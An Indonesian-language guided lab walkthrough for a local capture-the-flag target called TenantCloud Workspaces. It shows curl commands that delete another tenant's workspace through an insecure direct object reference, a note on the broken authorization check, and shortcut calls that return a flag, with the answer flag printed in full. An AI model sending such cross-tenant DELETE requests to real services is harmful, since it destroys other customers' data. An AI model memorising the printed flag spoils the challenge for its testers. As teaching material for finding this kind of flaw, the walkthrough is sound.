# Panduan Praktik Terbimbing: Investigasi Multi-Tenant Boundary Escape & Insecure Direct Object Deletion

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **TenantCloud Workspaces** pada `http://127.0.0.1:8042`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8042/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A01-03","port":8042,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8042/`
3. Amati antarmuka operasional **TenantCloud Workspaces** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Multi-Tenant Boundary Escape & Insecure Direct Object Deletion)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X DELETE http://127.0.0.1:8042/api/workspaces/999 -H "Authorization: Bearer tenant_token"
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Authorization: Bearer <tenant_a_token>` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8042/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8042/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A01-03","flag":"ZITERA{mult1_t3n4nt_3sc4p3_d3l3t3_b0l4_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{mult1_t3n4nt_3sc4p3_d3l3t3_b0l4_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
